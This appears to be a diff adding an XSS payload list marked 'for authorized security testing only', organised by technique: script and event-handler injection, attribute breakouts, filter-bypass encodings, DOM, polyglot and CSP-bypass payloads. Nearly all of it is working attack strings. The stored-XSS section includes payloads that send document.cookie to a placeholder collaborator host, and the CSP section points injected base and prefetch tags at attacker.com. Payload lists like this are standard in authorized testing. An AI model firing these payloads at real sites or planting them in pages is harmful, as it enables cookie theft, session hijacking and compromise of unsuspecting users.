@@ -1,0 +1,121 @@
+# Cross-Site Scripting (XSS) Payloads
+# For authorized security testing only
+#
+# Categories:
+#   [BASIC]    - Standard script injection
+#   [ATTR]     - Attribute-based injection
+#   [EVENT]    - Event handler injection
+#   [FILTER]   - Filter bypass techniques
+#   [DOM]      - DOM-based XSS
+#   [STORED]   - Stored XSS probes
+#   [POLY]     - Polyglot payloads
+
+# ─── BASIC SCRIPT INJECTION ───────────────────────────────────────
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+</script><script>alert(1)</script>
+'"><script>alert(1)</script>
+
+# ─── IMG-BASED ────────────────────────────────────────────────────
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src="javascript:alert(1)">
+<img/src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+
+# ─── EVENT HANDLER INJECTION ──────────────────────────────────────
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<iframe onload=alert(1)></iframe>
+<object onerror=alert(1)>
+<marquee onstart=alert(1)>
+<div onclick=alert(1)>click me</div>
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:alert(1)>click</a>
+
+# ─── ATTRIBUTE INJECTION ──────────────────────────────────────────
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+javascript:alert(1)
+\"><script>alert(1)</script>
+`onerror=alert(1)`
+
+# ─── FILTER BYPASS ────────────────────────────────────────────────
+# Case variation
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x OnErRoR=alert(1)>
+
+# Encoding
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+%3Cscript%3Ealert(1)%3C/script%3E
+\u003cscript\u003ealert(1)\u003c/script\u003e
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+
+# Tag breaking
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr ipt>alert(1)</scr ipt>
+
+# Null bytes
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<scr\x00\x00ipt>alert(1)</scr\x00\x00ipt>
+
+# Extra whitespace
+<  script>alert(1)</  script>
+< script >alert(1)</ script >
+
+# Comment insertion
+<scr<!---->ipt>alert(1)</scr<!---->ipt>
+
+# SVG-based
+<svg><script>alert(1)</script></svg>
+<svg><script xlink:href=data:,alert(1) />
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+
+# Data URI
+<iframe src="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+# ─── DOM-BASED XSS ────────────────────────────────────────────────
+javascript:alert(document.cookie)
+#"><img src=/ onerror=alert(2)>
+#<script>alert(1)</script>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+# ─── STORED XSS PROBES ────────────────────────────────────────────
+# Use unique identifiers to confirm persistence
+<script>alert('STORED-XSS-TEST-001')</script>
+<img src=x onerror="fetch('https://your-collaborator.com/'+document.cookie)">
+<script>new Image().src='https://your-collaborator.com/?c='+document.cookie</script>
+
+# ─── POLYGLOT PAYLOADS ────────────────────────────────────────────
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'>"><img src=x onerror=alert(1)>
+'"--></style></script><svg onload=alert(1)>
+</textarea></script><script>alert(1)</script>
+</title><script>alert(1)</script>
+\"><svg onload=alert(1)//
+
+# ─── CSP BYPASS ───────────────────────────────────────────────────
+<link rel=prefetch href="//attacker.com/?c=">
+<script src="https://cdn.trusted.com/angular.js"></script>
+<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click</div></div>
+<base href="https://attacker.com/">
